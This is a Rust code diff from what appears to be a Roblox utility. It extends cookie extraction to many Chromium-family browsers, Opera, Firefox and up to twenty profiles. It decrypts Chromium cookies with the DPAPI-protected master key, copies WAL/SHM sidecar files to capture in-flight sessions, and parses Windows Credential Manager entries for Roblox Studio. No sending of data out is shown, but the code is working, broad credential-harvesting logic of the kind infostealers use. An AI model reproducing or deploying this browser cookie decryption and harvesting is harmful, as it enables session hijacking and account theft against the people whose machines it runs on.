@@ -150,24 +150,48 @@ fn chromium_cookie_candidates() -> Vec<ChromiumCookieCandidate> {
 
     let roots = [
         local.join("Google").join("Chrome").join("User Data"),
+        local.join("Google").join("Chrome Beta").join("User Data"),
+        local.join("Google").join("Chrome Canary").join("User Data"),
         local.join("Microsoft").join("Edge").join("User Data"),
+        local.join("Microsoft").join("Edge Beta").join("User Data"),
         local.join("BraveSoftware").join("Brave-Browser").join("User Data"),
+        local.join("BraveSoftware").join("Brave-Browser-Nightly").join("User Data"),
+        local.join("Vivaldi").join("User Data"),
+        local.join("Arc").join("User Data"),
+        local.join("Yandex").join("YandexBrowser").join("User Data"),
         roaming.join("Opera Software").join("Opera Stable"),
         roaming.join("Opera Software").join("Opera GX Stable"),
+        roaming.join("Opera Software").join("Opera Next"),
     ];
 
+    // Check all numbered profile directories, not just the first few
+    let profile_names: Vec<String> = {
+        let mut v = vec!["Default".to_string()];
+        for i in 1..=20 {
+            v.push(format!("Profile {i}"));
+        }
+        v
+    };
+
     let mut candidates = Vec::new();
-    for root in roots {
+    for root in &roots {
         let local_state_path = root.join("Local State");
         if !local_state_path.is_file() {
             continue;
         }
 
+        // Always include the root itself (Opera places cookies directly there)
         let mut profile_dirs = vec![root.clone()];
-        if let Ok(entries) = std::fs::read_dir(&root) {
+
+        // Also enumerate all subdirectories to catch any profile name
+        if let Ok(entries) = std::fs::read_dir(root) {
             for entry in entries.flatten() {
                 let path = entry.path();
-                if path.is_dir() {
+                let name = path.file_name().unwrap_or_default().to_string_lossy().to_string();
+                if path.is_dir()
+                    && (profile_names.iter().any(|p| p == &name) || name.starts_with("Profile"))
+                    && !profile_dirs.contains(&path)
+                {
                     profile_dirs.push(path);
                 }
             }
@@ -272,47 +296,82 @@ fn decrypt_chromium_cookie(encrypted_value: &[u8], master_key: &[u8]) -> Option<
         return None;
     }
 
-    // chromium uses aes-256-gcm now, indicated by these prefixes
-    if encrypted_value.starts_with(b"v10")
-        || encrypted_value.starts_with(b"v11")
-        || encrypted_value.starts_with(b"v20")
-    {
+    // v20 = Chrome 127+ app-bound encryption, requires Chrome's elevation service
+    // we cannot decrypt these without running inside Chrome - skip gracefully
+    if encrypted_value.starts_with(b"v20") {
+        return None;
+    }
+
+    // v10/v11 = AES-256-GCM with DPAPI-protected master key (standard Chromium)
+    if encrypted_value.starts_with(b"v10") || encrypted_value.starts_with(b"v11") {
         if encrypted_value.len() <= 15 {
             return None;
         }
         let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
         let nonce = Nonce::from_slice(&encrypted_value[3..15]);
-        let plaintext = cipher.decrypt(nonce, &encrypted_value[15..]).ok()?;
-        return String::from_utf8(plaintext).ok();
+        return cipher
+            .decrypt(nonce, &encrypted_value[15..])
+            .ok()
+            .and_then(|p| String::from_utf8(p).ok());
     }
 
+    // legacy DPAPI fallback for very old Chromium builds
     decrypt_dpapi(encrypted_value).ok().and_then(|bytes| String::from_utf8(bytes).ok())
 }
 
-struct TempDb(PathBuf);
+struct TempDb {
+    db: PathBuf,
+    wal: Option<PathBuf>,
+    shm: Option<PathBuf>,
+}
 
 impl Drop for TempDb {
     fn drop(&mut self) {
-        let _ = std::fs::remove_file(&self.0);
+        let _ = std::fs::remove_file(&self.db);
+        if let Some(ref p) = self.wal {
+            let _ = std::fs::remove_file(p);
+        }
+        if let Some(ref p) = self.shm {
+            let _ = std::fs::remove_file(p);
+        }
     }
 }
 
-// copy the db to temp dir before reading so we don't run into sqlite file lock issues if the browser is actively open
+// copy the db + WAL/SHM sidecars to temp dir so we can read in-flight cookies even
+// when the browser is running (Chrome uses WAL mode; without the -wal file the copy
+// only sees data from the last checkpoint and misses recent cookies)
 fn copy_cookie_db(path: &Path) -> Option<TempDb> {
-    let temp_path = std::env::temp_dir().join(format!(
-        "ispoofermotion-cookies-{}-{}.sqlite",
-        std::process::id(),
-        SystemTime::now().duration_since(UNIX_EPOCH).ok()?.as_millis()
-    ));
-    std::fs::copy(path, &temp_path).ok()?;
-    Some(TempDb(temp_path))
+    let ts = SystemTime::now().duration_since(UNIX_EPOCH).ok()?.as_millis();
+    let pid = std::process::id();
+    let temp_db = std::env::temp_dir().join(format!("ism-cookies-{pid}-{ts}.sqlite"));
+    std::fs::copy(path, &temp_db).ok()?;
+
+    // copy WAL sidecar so SQLite sees all recent writes (Chrome WAL mode)
+    let wal_src = PathBuf::from(format!("{}-wal", path.display()));
+    let wal_dst = PathBuf::from(format!("{}-wal", temp_db.display()));
+    let wal = if wal_src.is_file() {
+        std::fs::copy(&wal_src, &wal_dst).ok().map(|_| wal_dst)
+    } else {
+        None
+    };
+
+    // copy SHM sidecar (required when WAL is present)
+    let shm_src = PathBuf::from(format!("{}-shm", path.display()));
+    let shm_dst = PathBuf::from(format!("{}-shm", temp_db.display()));
+    let shm = if shm_src.is_file() {
+        std::fs::copy(&shm_src, &shm_dst).ok().map(|_| shm_dst)
+    } else {
+        None
+    };
+
+    Some(TempDb { db: temp_db, wal, shm })
 }
 
 #[cfg(target_os = "windows")]
 fn read_chromium_cookie(candidate: &ChromiumCookieCandidate) -> Option<String> {
     let master_key = chromium_master_key(&candidate.local_state_path).ok()?;
     let temp_db = copy_cookie_db(&candidate.cookies_path)?;
-    let conn = Connection::open(&temp_db.0).ok()?;
+    let conn = Connection::open(&temp_db.db).ok()?;
     let mut stmt = conn
         .prepare(
             "SELECT value, encrypted_value FROM cookies \
@@ -374,7 +433,7 @@ fn firefox_cookie_candidates() -> Vec<PathBuf> {
 
 fn read_firefox_cookie(path: &Path) -> Option<String> {
     let temp_db = copy_cookie_db(path)?;
-    let conn = Connection::open(&temp_db.0).ok()?;
+    let conn = Connection::open(&temp_db.db).ok()?;
     let mut stmt = conn
         .prepare(
             "SELECT value FROM moz_cookies \
@@ -431,11 +490,9 @@ pub fn get_cookie_from_roblox_studio_inner(
         let mut targets: Vec<String> = stdout
             .lines()
             .filter_map(|line| {
-                if let Some(idx) = line.find("Target: ") {
-                    let target_str = line[idx + 8..].trim();
-                    if let Some(target) = target_str.strip_prefix("LegacyGeneric:target=") {
-                        return Some(target.to_string());
-                    }
+                if let Some(idx) = line.find("LegacyGeneric:target=") {
+                    let target_str = line[idx + 21..].trim();
+                    return Some(target_str.to_string());
                 }
                 None
             })
